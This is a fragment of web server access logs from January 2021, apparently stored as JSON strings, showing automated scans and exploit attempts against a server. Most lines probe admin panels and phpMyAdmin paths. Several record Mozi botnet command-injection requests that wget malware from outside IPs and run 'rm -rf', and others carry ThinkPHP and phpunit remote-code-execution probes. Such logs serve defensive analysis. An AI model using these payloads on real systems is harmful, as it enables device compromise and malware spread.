            "127.0.0.1 - - [27/Jan/2021:12:16:30 +0000] \"GET /shell?%2Ftmp%2FMozi.a+jaws=&cd+%2Ftmp=&chmod+777+Mozi.a=&rm+-rf+%2A=&wget+http%3A%2F%2F117.222.174.115%3A47116%2FMozi.a= HTTP/1.0\" 404 232 \"-\" \"Hello, world\"\n",
            "127.0.0.1 - - [27/Jan/2021:13:00:38 +0000] \"GET /swagger HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\"\n",
            "127.0.0.1 - - [27/Jan/2021:13:05:51 +0000] \"GET /login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - - [27/Jan/2021:13:05:51 +0000] \"GET /jenkins/login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - j4BFwu6M [27/Jan/2021:13:05:52 +0000] \"GET /manager/html HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - - [27/Jan/2021:13:21:27 +0000] \"GET /login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - - [27/Jan/2021:13:21:27 +0000] \"GET /jenkins/login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - yiWsBbJP [27/Jan/2021:13:21:27 +0000] \"GET /manager/html HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - - [27/Jan/2021:15:00:09 +0000] \"POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
            "127.0.0.1 - - [27/Jan/2021:15:00:09 +0000] \"POST /api/jsonws/invoke HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
            "127.0.0.1 - - [27/Jan/2021:15:00:10 +0000] \"GET /solr/admin/info/system?wt=json HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
            "127.0.0.1 - - [27/Jan/2021:15:00:10 +0000] \"GET /index.php?function=call_user_func_array&s=%2FIndex%2F%5Cthink%5Capp%2Finvokefunction&vars%5B0%5D=md5&vars%5B1%5D%5B%5D=HelloThinkPHP21 HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
            "127.0.0.1 - - [27/Jan/2021:15:00:11 +0000] \"GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
            "127.0.0.1 - - [27/Jan/2021:15:00:11 +0000] \"GET /?a=fetch&content=%3Cphp%3Edie%28%40md5%28HelloThinkCMF%29%29%3C%2Fphp%3E HTTP/1.0\" 200 7 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
            "127.0.0.1 - - [27/Jan/2021:15:00:12 +0000] \"GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.0\" 200 7 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
            "127.0.0.1 - - [27/Jan/2021:15:00:12 +0000] \"GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
            "127.0.0.1 - - [27/Jan/2021:15:00:12 +0000] \"GET /console/ HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
            "127.0.0.1 - - [27/Jan/2021:15:00:12 +0000] \"POST /Autodiscover/Autodiscover.xml HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
            "127.0.0.1 - - [27/Jan/2021:15:11:45 +0000] \"GET /Telerik.Web.UI.WebResource.axd?type=rau HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\"\n",
            "127.0.0.1 - - [27/Jan/2021:16:18:02 +0000] \"GET /config/getuser?index=0 HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0\"\n",
            "127.0.0.1 - - [27/Jan/2021:16:32:57 +0000] \"POST /boaform/admin/formLogin HTTP/1.0\" 404 232 \"http://20.193.18.43:80/admin/login.asp\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0\"\n",
            "127.0.0.1 - - [27/Jan/2021:16:51:55 +0000] \"GET /config/getuser?index=0 HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0\"\n",
            "127.0.0.1 - - [27/Jan/2021:19:58:55 +0000] \"GET /nmaplowercheck1611777531 HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\"\n",
            "127.0.0.1 - - [27/Jan/2021:19:58:58 +0000] \"GET /repos/ HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\"\n",
            "127.0.0.1 - - [27/Jan/2021:19:58:58 +0000] \"GET /repo/ HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\"\n",
            "127.0.0.1 - - [27/Jan/2021:19:58:58 +0000] \"GET /svn/ HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\"\n",
            "127.0.0.1 - - [27/Jan/2021:19:58:58 +0000] \"GET /cvs/ HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\"\n",
            "127.0.0.1 - - [27/Jan/2021:19:58:58 +0000] \"GET /archiva/index.action HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\"\n",
            "127.0.0.1 - - [27/Jan/2021:19:58:58 +0000] \"GET /index.action HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\"\n",
            "127.0.0.1 - - [27/Jan/2021:21:19:11 +0000] \"GET /login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - - [27/Jan/2021:21:19:12 +0000] \"GET /jenkins/login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - zVxLyS0s [27/Jan/2021:21:19:12 +0000] \"GET /manager/html HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - - [27/Jan/2021:22:08:07 +0000] \"GET /config/getuser?index=0 HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0\"\n",
            "127.0.0.1 - - [27/Jan/2021:22:49:41 +0000] \"GET /HNAP1/ HTTP/1.0\" 404 232 \"http://20.193.18.43/\" \"Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1\"\n",
            "127.0.0.1 - - [27/Jan/2021:23:02:44 +0000] \"GET /setup.cgi?cmd=rm+-rf+%2Ftmp%2F%2A&curpath=%2F&currentsetting.htm=1&next_file=netgear.cfg&sh+netgear=&todo=syscmd&wget+http%3A%2F%2F117.194.167.17%3A54210%2FMozi.m+-O+%2Ftmp%2Fnetgear= HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - - [28/Jan/2021:00:09:22 +0000] \"GET /login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - - [28/Jan/2021:00:09:22 +0000] \"GET /jenkins/login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - UQJXDMjj [28/Jan/2021:00:09:22 +0000] \"GET /manager/html HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - - [28/Jan/2021:03:53:57 +0000] \"GET /swagger HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\"\n",
            "127.0.0.1 - - [28/Jan/2021:08:31:56 +0000] \"GET /TP/public/index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
            "127.0.0.1 - - [28/Jan/2021:08:31:57 +0000] \"GET /TP/index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
            "127.0.0.1 - - [28/Jan/2021:08:31:57 +0000] \"GET /thinkphp/html/public/index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
            "127.0.0.1 - - [28/Jan/2021:08:31:58 +0000] \"GET /html/public/index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
            "127.0.0.1 - - [28/Jan/2021:08:31:58 +0000] \"GET /public/index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
            "127.0.0.1 - - [28/Jan/2021:08:31:58 +0000] \"GET /TP/html/public/index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
            "127.0.0.1 - - [28/Jan/2021:08:31:59 +0000] \"GET /elrekt.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
            "127.0.0.1 - - [28/Jan/2021:08:31:59 +0000] \"GET /index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
            "127.0.0.1 - - [28/Jan/2021:14:18:55 +0000] \"GET /config/getuser?index=0 HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0\"\n",
            "127.0.0.1 - Cm7lenWq [28/Jan/2021:15:04:23 +0000] \"GET /manager/html/ HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - - [28/Jan/2021:15:56:15 +0000] \"GET /echo.php HTTP/1.0\" 404 232 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36\"\n",
            "127.0.0.1 - - [28/Jan/2021:16:09:57 +0000] \"POST /HNAP1/ HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - - [28/Jan/2021:16:25:38 +0000] \"GET /index.php?function=call_user_func_array&s=%2FIndex%2F%5Cthink%5Capp%2Finvokefunction&vars%5B0%5D=md5&vars%5B1%5D%5B%5D=HelloThinkPHP21 HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
            "127.0.0.1 - - [28/Jan/2021:16:25:38 +0000] \"POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
            "127.0.0.1 - - [28/Jan/2021:16:25:38 +0000] \"GET /console/ HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
            "127.0.0.1 - - [28/Jan/2021:16:25:38 +0000] \"POST /api/jsonws/invoke HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
            "127.0.0.1 - - [28/Jan/2021:16:25:39 +0000] \"GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.0\" 200 7 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
            "127.0.0.1 - - [28/Jan/2021:16:25:40 +0000] \"GET /?a=fetch&content=%3Cphp%3Edie%28%40md5%28HelloThinkCMF%29%29%3C%2Fphp%3E HTTP/1.0\" 200 7 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
            "127.0.0.1 - - [28/Jan/2021:16:25:40 +0000] \"GET /solr/admin/info/system?wt=json HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
            "127.0.0.1 - - [28/Jan/2021:16:25:41 +0000] \"POST /Autodiscover/Autodiscover.xml HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
            "127.0.0.1 - - [28/Jan/2021:16:25:41 +0000] \"GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
            "127.0.0.1 - - [28/Jan/2021:16:25:41 +0000] \"GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
            "127.0.0.1 - - [28/Jan/2021:16:48:52 +0000] \"GET /config/getuser?index=0 HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0\"\n",
            "127.0.0.1 - - [28/Jan/2021:19:09:22 +0000] \"GET /login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - - [28/Jan/2021:19:09:22 +0000] \"GET /jenkins/login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - Z2UNu1KS [28/Jan/2021:19:09:22 +0000] \"GET /manager/html HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - XoPm5ozI [28/Jan/2021:21:57:52 +0000] \"GET /manager/html/ HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - - [28/Jan/2021:22:33:10 +0000] \"GET /config/getuser?index=0 HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0\"\n",
            "2021-01-28 22:58:42,100 | root | INFO | 200\n",
            "127.0.0.1 - - [28/Jan/2021:22:58:42 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
            "2021-01-28 22:58:43,089 | root | INFO | 200\n",
            "127.0.0.1 - - [28/Jan/2021:22:58:43 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - - [29/Jan/2021:02:31:26 +0000] \"GET /favicon.ico HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0\"\n",
            "127.0.0.1 - - [29/Jan/2021:02:55:36 +0000] \"GET /actuator/health HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 zgrab/0.x\"\n",
            "127.0.0.1 - - [29/Jan/2021:04:25:33 +0000] \"GET /nmaplowercheck1611894325 HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\"\n",
            "127.0.0.1 - - [29/Jan/2021:04:25:33 +0000] \"GET /pools/default/buckets HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\"\n",
            "127.0.0.1 - - [29/Jan/2021:04:25:34 +0000] \"GET /pools HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\"\n",
            "2021-01-29 05:07:41,464 | root | INFO | 200\n",
            "127.0.0.1 - - [29/Jan/2021:05:07:41 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
            "2021-01-29 05:07:41,479 | root | INFO | 200\n",
            "127.0.0.1 - - [29/Jan/2021:05:07:41 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:13 +0000] \"GET /phpmyadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:14 +0000] \"GET /phpMyadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:15 +0000] \"GET /phpMyAdmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:15 +0000] \"GET /phpmyAdmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:16 +0000] \"GET /mysql/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:17 +0000] \"GET /database/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:17 +0000] \"GET /phpmyadmin1/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:18 +0000] \"GET /phpmyadmin2/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:19 +0000] \"GET /phpmyadmin3/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:19 +0000] \"GET /phpmyadmin4/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:20 +0000] \"GET /phpmyadmin5/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:21 +0000] \"GET /phpMyAdmin1/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:21 +0000] \"GET /phpMyAdmin2/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:22 +0000] \"GET /phpMyAdmin3/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:23 +0000] \"GET /phpMyAdmin4/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:23 +0000] \"GET /phpMyAdmin5/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:24 +0000] \"GET /mysql/admin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:25 +0000] \"GET /mysql/dbadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:25 +0000] \"GET /mysql/sqlmanager/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:26 +0000] \"GET /mysql/mysqlmanager/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:26 +0000] \"GET /2phpmyadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:27 +0000] \"GET /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:28 +0000] \"GET /phpmy/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:28 +0000] \"GET /phppma/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:29 +0000] \"GET /myadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:30 +0000] \"GET /shopdb/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:30 +0000] \"GET /MyAdmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:31 +0000] \"GET /program/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:32 +0000] \"GET /PMA/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:32 +0000] \"GET /dbadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:33 +0000] \"GET /pma/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:34 +0000] \"GET /db/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:34 +0000] \"GET /admin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:35 +0000] \"GET /db/phpmyadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:36 +0000] \"GET /db/phpMyAdmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
